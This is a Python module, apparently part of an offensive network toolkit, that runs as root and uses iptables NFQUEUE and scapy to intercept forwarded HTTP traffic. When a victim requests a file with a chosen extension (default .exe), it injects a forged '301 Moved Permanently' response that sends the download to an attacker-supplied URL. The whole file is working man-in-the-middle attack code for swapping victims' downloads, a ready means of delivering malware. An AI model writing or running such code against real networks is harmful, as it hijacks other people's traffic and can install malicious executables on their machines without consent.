#!/usr/bin/env python3
import subprocess
from core.banner import info, success, warn, error
from core.checker import check_root

def set_load(scapy, packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def run(args):
    check_root(exit_on_failure=True)
    redirect_url = args.redirect_url
    if not redirect_url:
        error('Replacement download URL (-u / --redirect-url) is required.')
        return 1
    extension = args.extension or '.exe'
    queue_num = args.queue_num if args.queue_num is not None else 0
    try:
        import netfilterqueue
        import scapy.all as scapy
    except ImportError as e:
        error(f'Missing dependency: {e}')
        error('Install via: sudo apt install libnetfilter-queue-dev && pip install netfilterqueue scapy')
        return 1
    ack_list = []
    info(f'Target file extension to intercept: {extension}')
    info(f'Redirecting download to:           {redirect_url}')
    subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', str(queue_num)])
    success('iptables NFQUEUE forwarding rule activated.')

    def process_packet(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            try:
                load = scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                if scapy_packet[scapy.TCP].dport == 80:
                    if extension in load and redirect_url not in load:
                        info(f"Download request detected matching extension '{extension}'.")
                        ack_list.append(scapy_packet[scapy.TCP].ack)
                elif scapy_packet[scapy.TCP].sport == 80:
                    if scapy_packet[scapy.TCP].seq in ack_list:
                        ack_list.remove(scapy_packet[scapy.TCP].seq)
                        success('Injecting HTTP 301 Redirect to replacement URL...')
                        redirect_response = f'HTTP/1.1 301 Moved Permanently\r\nLocation: {redirect_url}\r\n\r\n'
                        modified_pkt = set_load(scapy, scapy_packet, redirect_response.encode('utf-8'))
                        packet.set_payload(bytes(modified_pkt))
            except Exception:
                pass
        packet.accept()
    queue = netfilterqueue.NetfilterQueue()
    try:
        queue.bind(queue_num, process_packet)
        info('Monitoring traffic... Press Ctrl+C to terminate.')
        queue.run()
    except KeyboardInterrupt:
        info('\nStopping Download Replacer...')
    finally:
        warn('Flushing iptables...')
        subprocess.call(['iptables', '--flush'])
    return 0
